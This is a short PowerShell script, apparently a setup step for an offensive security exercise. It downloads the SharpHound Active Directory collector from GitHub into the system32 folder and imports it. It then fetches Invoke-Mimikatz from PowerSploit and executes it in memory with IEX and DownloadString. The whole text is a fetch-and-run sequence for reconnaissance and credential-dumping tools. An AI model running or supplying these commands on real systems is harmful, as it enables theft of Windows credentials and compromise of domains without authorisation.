#Installing Dependencies

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
#Install Sharphound
Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "C:\WINDOWS\system32\SharpHound.ps1";
import-module C:\WINDOWS\system32\SharpHound.ps1;

#Install Mimikatz
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');

